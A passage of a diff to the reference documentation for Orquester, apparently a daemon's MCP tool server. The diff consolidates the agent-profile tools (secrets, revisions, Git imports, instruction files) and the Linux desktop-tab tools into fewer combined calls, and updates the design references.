-rewrites, but nothing here restores one). `copy_agent_profile_item` converts an MCP server, skill
-or command to another agent's format — MCP secret values move daemon-side, never through you — and
-names in `notes` what the target could not hold (a Codex copy of a command becomes a skill).
+`disable` turns an item off natively where the CLI has a switch, or moves it to Orquester's stash
+(and back, with `enable`) where it has none (`stashed: true` while off). `delete` removes it
+(Orquester keeps a backup of every file it rewrites, but nothing here restores one). `copy`
+converts an MCP server, skill or command to another agent's format — MCP secret values move
+daemon-side, never through you — and names in `notes` what the target could not hold (a Codex copy
+of a command becomes a skill).
 
 ### Revisions
 
 Every item has a `revision` (a hash of its content and on/off state), and so does the instruction
-file. **`revision` is optional on every write:** when you omit it, the tool reads the current one
+file. **`revision` is optional on every change:** when you omit it, the tool reads the current one
 just before writing — right for most edits. Pass the revision you read when you want the write to
 fail if someone (the owner in the panel, the CLI itself) changed the item in between: the daemon
 then answers **`PROFILE_CONFLICT`**, and the tool adds the item's fresh summary under
 `detail.item` (or `detail.itemGone: true` when it no longer exists under that id) — re-check, then
-retry with the new revision. `write_agent_instructions`' conflict carries `detail.instructions`
-(the file's current info); its `revision: ""` means "the file must not exist yet".
+retry with the new revision. A `write_instructions` conflict carries `detail.instructions` (the
+file's current info); its `revision: ""` means "the file must not exist yet".
 
 ### Instructions
 
-`get_agent_instructions` returns the whole file when it fits; a longer one comes in pages —
-`truncated: true`, and `nextOffset` to pass back as `offset`. `write_agent_instructions` **replaces
-the whole file**: read it, change it, send the complete text — never a partial or a cut page.
+`get_agent_profile {agent, instructions: true}` returns the whole file when it fits; a longer one
+comes in pages — `truncated: true`, and `nextOffset` to pass back as `offset`. A
+`write_instructions` change **replaces the whole file**: read it, change it, send the complete text
+— never a partial or a cut page.
 
 ### Imports from Git
 
-Two calls. First `{agent, url}`: the daemon clones the repository (https or ssh; a
-`…/tree/<ref>/<path>` URL picks a folder; a URL with credentials in it is refused — use ssh or the
-host's own git credentials) and scans it for skills (folders with a `SKILL.md`) and commands (`.md`
-files) → `{importId, candidates: [{ref, kind, name, exists}]}`. Then `{agent, importId, picks:
-[ref…], onConflict?}` imports those candidates; a candidate with `exists: true` needs `replace` or
-`keep-both`. A scan is single-use and expires after 15 minutes (`IMPORT_NOT_FOUND`: scan again).
-The URL is never echoed back. (The panel's zip/markdown upload is not exposed over the MCP.)
+Two changes, usually in two calls. First `import_scan {url}`: the daemon clones the repository
+(https or ssh; a `…/tree/<ref>/<path>` URL picks a folder; a URL with credentials in it is refused —
+use ssh or the host's own git credentials) and scans it for skills (folders with a `SKILL.md`) and
+commands (`.md` files) → `{importId, candidates: [{ref, kind, name, exists}]}`. Then `import_pick
+{importId, picks: [ref…], onConflict?}` imports those candidates; a candidate with `exists: true`
+needs `replace` or `keep-both`. A scan is single-use and expires after 15 minutes
+(`IMPORT_NOT_FOUND`: scan again). The URL is never echoed back. (The panel's zip/markdown upload is
+not exposed over the MCP.)
 
 ### Secrets
 
-**MCP env and header values are write-only.** A tool takes them as `{KEY: value}` maps and passes
+**MCP env and header values are write-only.** A change takes them as `{KEY: value}` maps and passes
 them to the daemon, which writes them into the CLI's own config file; no result, error or log ever
 contains a value — every view of a server lists `{key, set: true}` only (the tool rebuilds each
 entry from its key, whatever the route sends). Credentials written into an MCP server's or a git
 marketplace's URL (`https://user:token@host/…`) are shown as `https://***@host/…`; an update that
-does not name `url` keeps the real one. But **the values you pass stay in your own
-transcript and tool logs**: prefer asking the user to enter secrets in the Orquester UI, and use
-`update_agent_profile_item` with the keys you do not touch left out rather than resending them.
+does not name `url` keeps the real one. But **the values you pass stay in your own transcript and
+tool logs**: prefer asking the user to enter secrets in the Orquester UI, and leave out of an
+`update` the keys you do not touch rather than resending them. (In-chat agents pass `{ask: true}`
+instead, and the user types the value into the approval card.)
 
 ### Errors
 
 The daemon's codes pass through unchanged, a hint appended where a tool helps: `UNKNOWN_AGENT`,
-`AGENT_NOT_INSTALLED` (`list_agent_profiles`), `KIND_NOT_SUPPORTED` (`authoring.creatableKinds`),
-`ITEM_NOT_FOUND` (`get_agent_profile`), `ITEM_EXISTS` (`onConflict`), `ITEM_LOCKED`,
+`AGENT_NOT_INSTALLED` (`get_agent_profile {}`), `KIND_NOT_SUPPORTED` (`authoring.creatableKinds`),
+`ITEM_NOT_FOUND` (`get_agent_profile {agent}`), `ITEM_EXISTS` (`onConflict`), `ITEM_LOCKED`,
 `NOT_EDITABLE`, `NOT_TOGGLEABLE`, `NOT_DELETABLE`, `INVALID_NAME`, `INVALID_ITEM` (the agent's own
 rule, e.g. OpenCode needs a skill description), `INVALID_REQUEST`, `PROFILE_CONFLICT` (above),
 `CONFIG_UNREADABLE`, `STASH_CONFLICT`, `AGENT_CLI_FAILED` (a CLI call such as a plugin install
 failed; its redacted stderr is in the message), `WRITE_VERIFY_FAILED` (the file no longer parsed
 and was restored), `IMPORT_NOT_FOUND`, `IMPORT_FAILED`, `AGENT_PROFILE_ERROR`. Argument problems
-the tool catches itself — no kind object or two of them, a stdio field on an http server — are
-`INVALID_ARGUMENT`.
+the tool catches itself — no kind object or two of them, a stdio field on an http server, a field
+of another action — are `INVALID_ARGUMENT`, before anything is written.
 
 ### Example: add an MCP server to every installed agent
 
 ```
-list_agent_profiles { "installedOnly": true }
+get_agent_profile {}
 → { "agents": [ { "agent": "claude", "installed": true, "version": "2.1.3", "counts": { "mcp": 3, "skill": 12 } },
-                { "agent": "opencode", "installed": true, "counts": { "mcp": 2, "skill": 4 } } ] }
+                { "agent": "opencode", "installed": true, "counts": { "mcp": 2, "skill": 4 } } /* … */ ] }
 
-create_agent_profile_item { "agent": "claude",
-  "mcp": { "name": "jira", "command": "node", "args": ["/srv/jira/index.js"], "env": { "JIRA_API_TOKEN": "<token>" } } }
-→ { "created": true, "agent": "claude", "kind": "mcp", "itemIds": ["mcp:jira"], "notes": [], "items": [ { "id": "mcp:jira", … } ] }
+edit_agent_profile { "agent": "claude", "changes": [
+  { "action": "create", "mcp": { "name": "jira", "command": "node", "args": ["/srv/jira/index.js"], "env": { "JIRA_API_TOKEN": "<token>" } } },
+  { "action": "copy", "id": "mcp:jira", "toAgent": "opencode" } ] }
+→ { "agent": "claude", "changed": 2, "results": [
+      { "index": 0, "action": "create", "kind": "mcp", "itemIds": ["mcp:jira"], "notes": [], "items": [ { "id": "mcp:jira", … } ] },
+      { "index": 1, "action": "copy", "fromId": "mcp:jira", "toAgent": "opencode", "itemIds": ["mcp:jira"],
+        "notes": ["OpenCode servers restart when idle to pick this up."], "items": [ … ] } ] }
 
-copy_agent_profile_item { "agent": "claude", "id": "mcp:jira", "toAgent": "opencode" }
-→ { "copied": true, "fromAgent": "claude", "agent": "opencode", "itemIds": ["mcp:jira"],
-    "notes": ["OpenCode servers restart when idle to pick this up."], "items": [ … ] }
-
-get_agent_profile_item { "agent": "opencode", "id": "mcp:jira" }
+get_agent_profile { "agent": "opencode", "itemId": "mcp:jira" }
 → { "agent": "opencode", "item": { … },
     "mcp": { "name": "jira", "transport": "stdio", "command": "node", "args": ["/srv/jira/index.js"],
              "env": [ { "key": "JIRA_API_TOKEN", "set": true } ] }, "secretsNote": "…" }
 ```
+
+---
 
 ## 14. Desktops
 
@@ -2031,23 +2210,16 @@ A **desktop** is a tab that runs Linux GUI apps on the daemon's host: a virtual 
 (TigerVNC's `Xvnc`, the Openbox window manager, PulseAudio and a D-Bus session bus) that the user
 sees and controls live in the tab, with sound. Several apps can share one desktop — one display,
 one audio output — and the tab's window bar switches between their windows. Desktops live in their
-own tmux session, so they survive daemon restarts. These 9 tools are clients of the daemon's
+own tmux session, so they survive daemon restarts. These 2 tools are clients of the daemon's
 `/api/desktops*` routes, the tab's own: a desktop an agent opens appears as a tab in every client,
 and one the user opens is listed here.
 
 ### Tools
 
-| Tool | Input | Returns | Annotations |
-|---|---|---|---|
-| `desktops_list` | `projectPath?` (omit for every project) | `{desktops: [Desktop]}` | read-only |
-| `desktop_host_status` | — | `{available, audioAvailable, tools: [{name, path, required}], ffmpegPulse, ffmpegOpus, renderNode, tmuxUsable, warnings, installHint}` | read-only |
-| `desktop_open` | `projectPath`, `title?`, `size? {width, height}`, `renderThreads?`, `command?`, `cwd?`, `env?` | `{desktop: Desktop}` | write |
-| `desktop_launch_app` | `desktopId`, `command`, `cwd?`, `env?` | `{app: App}` | write |
-| `desktop_windows` | `desktopId` | `{desktopId, status, windows: [Window], activeWindowId, apps: [{id, command, status}]}` | read-only |
-| `desktop_window_action` | `desktopId`, `windowId`, `action` (`activate` \| `maximize` \| `close`) | `{done: true, desktopId, windowId, action}` | write |
-| `desktop_app_log` | `desktopId`, `appId` | `{desktopId, appId, text, truncated?}` | read-only |
-| `desktop_stop_app` | `desktopId`, `appId`, `force? = false` | `{stopped: true, desktopId, appId, force}` | destructive |
-| `desktop_close` | `desktopId` | `{closed: true, desktopId}` | destructive |
+| Tool | Input | Returns |
+|---|---|---|
+| `get_desktops` | `project?` (omit for every project), `desktopId?`, `appId?` (with `desktopId`), `host?` | `{desktops: [Desktop]}`; `{desktopId}`: `{desktop: Desktop}`; `{desktopId, appId}`: `{desktopId, appId, text, truncated?}`; `host: true` adds `host: {available, audioAvailable, tools: [{name, path, required}], ffmpegPulse, ffmpegOpus, renderNode, tmuxUsable, warnings, installHint}` |
+| `control_desktop` | `action` (`"open"` \| `"launch_app"` \| `"stop_app"` \| `"close_window"` \| `"close"`), `project?`, `desktopId?`, `appId?`, `windowId?`, `command?`, `cwd?`, `env?`, `title?`, `size?`, `renderThreads?`, `force?`, `reason?` | `open`: `{desktop: Desktop}`; `launch_app`: `{app: App}`; `stop_app`: `{stopped: true, desktopId, appId, force}`; `close_window`: `{done: true, desktopId, windowId, action}`; `close`: `{closed: true, desktopId}` |
 
 - **Desktop** is `{id, projectPath, title, order, createdAt, display, size, renderThreads, status:
   "starting" | "running" | "stopped" | "error", error?, audio: "available" | "unavailable", apps:
@@ -2055,24 +2227,24 @@ and one the user opens is listed here.
   "starting" | "running" | "exited", exitCode, startedAt, exitedAt}`; **Window** is `{id, title,
   appId, wmClass, maximized}` — `id` is the X window id in `0x…` hex, and `appId` is null for a
   window no launched app owns.
-- **Check `desktop_host_status` first.** Desktops need `Xvnc`, `openbox`, `dbus-daemon` and a tmux
+- **Check `get_desktops {host: true}` first.** Desktops need `Xvnc`, `openbox`, `dbus-daemon` and a tmux
   ≥ 3.2; sound needs PulseAudio and an ffmpeg with `pulse` input and `libopus`. Without the
-  required tools `desktop_open` answers `DESKTOP_UNAVAILABLE` and its message carries the host's
+  required tools `open` answers `DESKTOP_UNAVAILABLE` and its message carries the host's
   `apt-get install` line; installing is for the host's owner.
-- **`projectPath`** is an absolute path or `"workspace/project"`, as every tool's project (§5).
+- **`project`** is an absolute path or `"workspace/project"`, as every tool's project (§5).
 - **`command`** is one shell line (at most 4 096 characters), run as `sh -c 'exec <command>'` under
   `nice -n 10` with `DISPLAY`, `PULSE_SERVER` and the desktop's bus in its environment; `cwd` is
   absolute or relative to the project (default: the project); `env` names match
-  `[A-Za-z_][A-Za-z0-9_]*` and apply last, over the desktop's own wiring. `desktop_open`'s
+  `[A-Za-z_][A-Za-z0-9_]*` and apply last, over the desktop's own wiring. `open`'s
   `command`, `cwd` and `env` launch a first app once the display is up; `cwd` or `env` without
   `command` is `INVALID_ARGUMENT`.
 - **`size`** is 320×240 to 7680×4320 (default 1280×800); **`renderThreads`** is the software-OpenGL
   (llvmpipe) thread count per app, `LP_NUM_THREADS` (default 4).
-- **`desktop_window_action`**: `activate` raises and focuses; `maximize` toggles; `close` asks the
-  app to close (`_NET_CLOSE_WINDOW`), so it may prompt to save instead. `desktop_stop_app` sends
-  SIGTERM to the app's process group, then SIGKILL after 5 s (at once with `force`).
-  `desktop_close` stops every app and removes the tab everywhere — unsaved work is lost.
-- **`desktop_app_log`** returns the app's recent stdout and stderr (the daemon keeps the last
+- **`close_window`** asks the app to close (`_NET_CLOSE_WINDOW`), so it may prompt to save instead.
+  `stop_app` sends SIGTERM to the app's process group, then SIGKILL after 5 s (at once with
+  `force`). `close` stops every app and removes the tab everywhere — unsaved work is lost.
+  Raising or maximizing a window is the user's, in the tab (no tool sees the screen).
+- **`get_desktops {desktopId, appId}`** returns the app's recent stdout and stderr (the daemon keeps the last
   64 KiB); a log too long for one result keeps its tail, `truncated: true`.
 - **Errors**: the daemon's codes pass through (`DESKTOP_UNAVAILABLE`, a 404 `NOT_FOUND` for an
   unknown desktop, app or window, a 403 `FORBIDDEN` for a `cwd` outside the sandbox), with a hint
@@ -2080,9 +2252,12 @@ and one the user opens is listed here.
 
 ---
 
-*Design reference: `docs/superpowers/specs/2026-09-22-orquester-mcp-v2-design.md`.
-Implementation: `apps/daemon/src/mcp/` — `server.ts` (the mount and the tool list), `daemon-api.ts`
-(the in-process client), `views.ts`, `transcript.ts`, `wait.ts`, `attachments.ts` and `tools/`
-(`tools/workflows.ts` for §12; its design: `docs/superpowers/specs/2026-09-28-automated-workflows-design.md` §8;
-`tools/agent-profile.ts` for §13, over the routes of `docs/superpowers/specs/2026-09-28-agent-profile-design.md` §8;
-`tools/desktops.ts` for §14, over the routes of `docs/superpowers/specs/2026-09-30-desktop-tab-design.md` §7).*
+*Design references: `docs/superpowers/specs/2026-10-15-unified-orquester-mcp-design.md` (the unified
+catalog, tiers, approval cards, toolsets, the conversation protocol; §11 is the migration above) and
+`docs/superpowers/specs/2026-09-22-orquester-mcp-v2-design.md`. Implementation:
+`apps/daemon/src/mcp/` — `catalog/` (the tool contract and the catalog), `executor.ts` (the one
+runner of a tool), `gate/` (tiers, scope and the turn policy), `server.ts` (this server: the mount,
+the instructions and the external audience), `daemon-api.ts` (the in-process client), `views.ts`,
+`transcript.ts`, `wait.ts`, `attachments.ts` and `tools/` (one module per family:
+`tools/workflows.ts` for §12, `tools/agent-profile.ts` for §13, `tools/desktops.ts` for §14). The
+in-chat transport is `apps/daemon/src/session-tools/` (its README).*
